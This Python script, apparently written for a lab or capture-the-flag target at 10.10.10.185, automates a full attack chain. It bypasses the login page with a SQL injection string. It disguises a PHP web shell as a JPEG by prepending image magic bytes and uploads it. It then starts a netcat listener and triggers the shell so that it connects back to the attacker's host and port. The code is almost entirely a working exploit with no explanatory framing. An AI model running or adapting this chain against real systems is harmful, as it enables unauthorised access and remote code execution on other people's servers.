#! /usr/bin/env python3
import requests
import binascii
import sys
import threading
import time
import os

targetip = '10.10.10.185'
shell = "./shell.php"
s = requests.session()
h = "*"
head = h * 56
logo = ""
logo += "*                            ,,/,,, ,,                 *\n"
logo += "*   ..           .        ,& @@@ ,,,,                  *\n"
logo += "*                        ,@*  @@,                      *\n"
logo += "*                      ,@ &&@@/@@               .      *\n"
logo += "*                     ,@@&@@@@@@(,,.                   *\n"
logo += "*               ,,@&@@@@@@@@@@@@@@@@@@@@,,             *\n"
logo += "*                    ,@@@@ @@@& @@@@,                  *\n"
logo += "*                    ,@@@        &@@,                  *\n"
logo += "*         ..          ,@&@@@&@@@@@@                    *\n"
logo += "*                      ,*@ @@@@@@/,                    *\n"
logo += "*                         ,,@@,,                       *"

def handler(s: requests.session):
    time.sleep(2)
    shelltarg = f"http://{targetip}/images/uploads/shell.php.jpg"
    s.get(
        shelltarg,
        params={
            'lhost': localhost,
            'lport': localport
        }
    )
def usage():
    print("Usage; python3 ./automagic.py <localhost> <localport>")
try:
    localhost = sys.argv[1]
except IndexError:
    print("Local Host Not Defined")
    print('Usage: python3 ./automagic.py <Local Host> <Local Port>')
    exit()
try:
    localport = sys.argv[2]
except IndexError:
    print("Local port Not Defined")
    print('Usage: python3 ./automagic.py <Local Host> <Local Port>')
    exit()
def login():
    injection = "test' OR '1' = '1' -- -"
    logintarget = f"http://{targetip}/login.php"
    try:
        login = s.post(
            logintarget,
            allow_redirects=False,
            data={
                "username": injection,
                "password": injection
            }
        )
    except requests.exceptions.ConnectionError as connecterr:
        print("Cannot Connect to Host")
        print(head)
        exit()
    if login.status_code == 302:
        return upload()
    else:
        print('fail')

def upload():
    jpmag = "ffd8ffe000104a464946000101000001"
    binmagicbyte = binascii.unhexlify(jpmag)
    webshell = open("./shell.php", "rb").read()
    phpshell = binmagicbyte + webshell
    uploadtarget = f"http://{targetip}/upload.php"
    s.post(
        uploadtarget,
        files={
            'image': ('shell.php.jpg', phpshell, 'image/jpeg'),
            "submit": (None, 'Image Upload')
        },
        headers={
            "Accept-Language": "en-US,en;q=0.5",
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            'Upgrade-Insecure-Requests': "1",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            "Accept-Encoding": 'gzip, deflate',
        }
    )
    return shell()
def shell():
    listener = f"nc -lkvp {localport}"
    t = threading.Thread(target=os.system, args=(listener,))
    t.setDaemon(0)
    t.start()
    t1 = threading.Thread(target=handler, args=(s,))
    t1.setDaemon(0)
    t1.start()
def main():
    h = "*"
    head = h * 56
    print(head)
    print(logo)
    print(head)
    print('automagic')
    print('Usage: python3 ./automagic.py <Local Host> <Local Port>')
    print(head)
    return login()
main()
